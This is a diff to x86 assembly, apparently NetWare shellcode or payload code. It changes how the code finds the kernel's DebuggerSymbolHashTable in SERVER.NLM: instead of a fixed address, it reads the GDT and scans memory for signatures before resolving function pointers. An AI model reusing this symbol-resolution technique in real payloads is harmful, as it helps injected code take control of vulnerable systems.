@@ -87,20 +87,30 @@ r_end:
 
 
 main_code:
-        ; search DebuggerSymbolHashTable pointer
+        ; search DebuggerSymbolHashTable pointer using GDT system call gate
+        ; -> points inside SERVER.NLM
         cli
-        mov ebp, 0x300000  ; SERVER.NLM code
+        sub esp, 8
+        mov ecx, esp
+        sgdt [ecx]
 
+        cli
+        mov ebx, [ecx+2]
+
+        mov bp, word ptr [ebx+0x4E]
+        shl ebp, 16
+        mov bp, word ptr [ebx+0x48]
+        
 f_finddebugger:
-        cmp dword ptr[ebp], 0x8110eac1
+        cmp dword ptr[ebp], 0
         jnz f_next
-        cmp dword ptr[ebp+4], 0x0001ffe2
+        cmp dword ptr[ebp+4], 0x808bc201
         jz f_end
 f_next:
-        inc ebp
+        dec ebp
         jmp f_finddebugger
 f_end:
-        mov ebp, [ebp+0xc]
+        mov ebp, [ebp-7]
 
         ; resolve function pointers
         call current
